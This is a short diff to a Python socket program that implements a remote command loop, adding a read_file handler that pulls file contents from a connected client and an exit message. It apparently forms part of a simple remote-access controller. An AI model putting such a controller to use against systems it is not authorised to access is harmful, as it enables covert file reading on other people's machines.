@@ -33,7 +33,14 @@ def write_file(client_socket, cmd):
     pass
 
 def read_file(client_socket, cmd):
-    pass
+    client_socket.send(cmd.encode('utf-8'))
+    no = client_socket.recv(1024)
+    client_socket.send(b"ok")
+    for x in range(int(no)):
+       f = client_socket.recv(1024).decode()
+       sys.stdout.write(f)
+       sys.stdout.flush()
+       client_socket.send(b"ok")
 
 def cmd_manager(client_socket):
     while True:
@@ -65,6 +72,7 @@ def cmd_manager(client_socket):
         elif cmd == 'pwd':
             pass
         elif cmd == "exit":
+            client_socket.send(b"exit")
             break
         else:
             print("[*]Invalid Argument: %s" % command)
